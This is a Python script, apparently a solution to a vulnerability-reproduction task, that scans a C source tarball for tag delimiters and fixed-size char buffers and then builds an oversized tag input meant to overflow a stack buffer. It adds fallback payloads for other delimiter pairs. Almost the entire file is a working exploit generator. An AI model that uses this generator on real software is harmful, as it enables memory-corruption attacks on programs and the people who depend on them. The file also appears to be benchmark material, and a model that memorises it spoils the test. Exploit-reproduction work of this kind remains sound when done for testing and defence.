import os
import re
import tarfile


class Solution:
    def _iter_source_files(self, src_path):
        try:
            with tarfile.open(src_path, "r:*") as tf:
                for m in tf.getmembers():
                    if not m.isfile():
                        continue
                    name = m.name.lower()
                    if name.endswith((".c", ".h", ".cpp", ".cc", ".hpp", ".hh", ".txt", ".md")):
                        f = tf.extractfile(m)
                        if f is None:
                            continue
                        try:
                            data = f.read()
                        except Exception:
                            continue
                        yield name, data
        except Exception:
            return

    def _guess_delimiters(self, src_path):
        # Try to detect likely tag delimiters from source
        pairs = [
            ('<', '>'),
            ('[', ']'),
            ('(', ')'),
            ('{', '}'),
        ]
        scores = {p: 0 for p in pairs}
        lt_re_cache = {}
        gt_re_cache = {}
        str_re_cache = {}
        for open_c, close_c in pairs:
            # Expressions like == '<'
            lt_re_cache[(open_c, close_c)] = re.compile(r"==\s*'{}'".format(re.escape(open_c)))
            gt_re_cache[(open_c, close_c)] = re.compile(r"==\s*'{}'".format(re.escape(close_c)))
            # Also string literal occurrences
            str_re_cache[(open_c, close_c, 'o')] = re.compile(r"\"{}\"".format(re.escape(open_c)))
            str_re_cache[(open_c, close_c, 'c')] = re.compile(r"\"{}\"".format(re.escape(close_c)))

        any_scanned = False
        for _, data in self._iter_source_files(src_path):
            try:
                text = data.decode('latin1', 'ignore')
            except Exception:
                continue
            any_scanned = True
            for open_c, close_c in pairs:
                s = 0
                s += len(lt_re_cache[(open_c, close_c)].findall(text))
                s += len(gt_re_cache[(open_c, close_c)].findall(text))
                s += len(str_re_cache[(open_c, close_c, 'o')].findall(text))
                s += len(str_re_cache[(open_c, close_c, 'c')].findall(text))
                # Heuristic: look for strchr/memchr patterns too
                s += len(re.findall(r"strchr\s*\([^)]*,'{}'\)".format(re.escape(open_c)), text))
                s += len(re.findall(r"strchr\s*\([^)]*,'{}'\)".format(re.escape(close_c)), text))
                s += len(re.findall(r"memchr\s*\([^)]*,'{}'".format(re.escape(open_c)), text))
                s += len(re.findall(r"memchr\s*\([^)]*,'{}'".format(re.escape(close_c)), text))
                scores[(open_c, close_c)] += s

        # Prefer angle brackets unless evidence strongly favors something else
        # If no files scanned or all scores zero, default to angle brackets
        if not any_scanned or all(v == 0 for v in scores.values()):
            return '<', '>'

        # Choose the pair with max score, but if angle brackets tie for max or close, prefer them
        best_pair = max(scores.items(), key=lambda kv: kv[1])[0]
        if scores[('<', '>')] >= max(scores.values()) * 0.9:
            return '<', '>'
        return best_pair

    def _estimate_risky_length(self, src_path, default_len=2200, hard_max=16384):
        # Try to guess an output buffer size and exceed it
        candidates = []
        name_bias = ('out', 'buf', 'buffer', 'obuf', 'outbuf', 'tmp', 'tag', 'attr', 'name', 'line')
        arr_pat = re.compile(r"char\s+([A-Za-z_]\w*)\s*\[\s*(\d+)\s*\]")
        define_pat = re.compile(r"#\s*define\s+([A-Za-z_]\w*)\s+(\d+)")
        # Optional 'const char var[NUM];' patterns also matched
        for _, data in self._iter_source_files(src_path):
            try:
                text = data.decode('latin1', 'ignore')
            except Exception:
                continue
            for m in arr_pat.finditer(text):
                var, num = m.group(1), m.group(2)
                try:
                    size = int(num)
                except Exception:
                    continue
                bias = 1
                lname = var.lower()
                if any(k in lname for k in name_bias):
                    bias = 3
                candidates.append((size, bias))
            # Consider macros defining buffer sizes
            for m in define_pat.finditer(text):
                macro, val = m.group(1), m.group(2)
                lname = macro.lower()
                if any(k in lname for k in ('buf', 'buffer', 'out', 'output', 'line', 'tag')):
                    try:
                        size = int(val)
                    except Exception:
                        continue
                    candidates.append((size, 2))

        if not candidates:
            return default_len
        # Weighted max (prefer larger, but biased by name relevance)
        max_weighted = 0
        chosen = 0
        for size, bias in candidates:
            weighted = size * bias
            if weighted > max_weighted:
                max_weighted = weighted
                chosen = size

        # Determine payload len: exceed chosen by a margin but cap
        if chosen <= 0:
            return default_len
        # Ensure we exceed but not excessively
        payload_len = chosen + max(128, chosen // 8)
        payload_len = max(payload_len, default_len)
        payload_len = min(payload_len, hard_max)
        return payload_len

    def _build_payload(self, opener, closer, inner_len):
        # Build a payload aimed at overflowing a stack buffer when copying tag contents
        # Include a plausible tag name to ensure tag detection triggers
        tag_name = b"tag"
        # Ensure we don't exceed target inner length due to tag name and space
        # Build as: '<tag ' + 'A'*N + '>'
        # N should be inner_len but subtract tag name and space to keep approximate length
        padding_len = max(0, inner_len)
        payload = bytes([ord(opener)]) + tag_name + b" " + (b"A" * padding_len) + bytes([ord(closer)])
        return payload

    def solve(self, src_path: str) -> bytes:
        opener, closer = self._guess_delimiters(src_path)
        inner_len = self._estimate_risky_length(src_path, default_len=2200, hard_max=16384)

        # Primary payload with detected delimiters
        payload_primary = self._build_payload(opener, closer, inner_len)

        # Fallback patterns to increase robustness if detection is off; keep total size reasonable
        fallbacks = []
        if (opener, closer) != ('<', '>'):
            fallbacks.append(self._build_payload('<', '>', max(1024, inner_len)))
        if (opener, closer) != ('[', ']'):
            fallbacks.append(self._build_payload('[', ']', 1024))
        if (opener, closer) != ('{', '}'):
            fallbacks.append(self._build_payload('{', '}', 1024))

        # Combine: primary first, then small fallbacks separated by newlines
        combined = payload_primary + b"\n" + b"\n".join(fallbacks)
        return combined
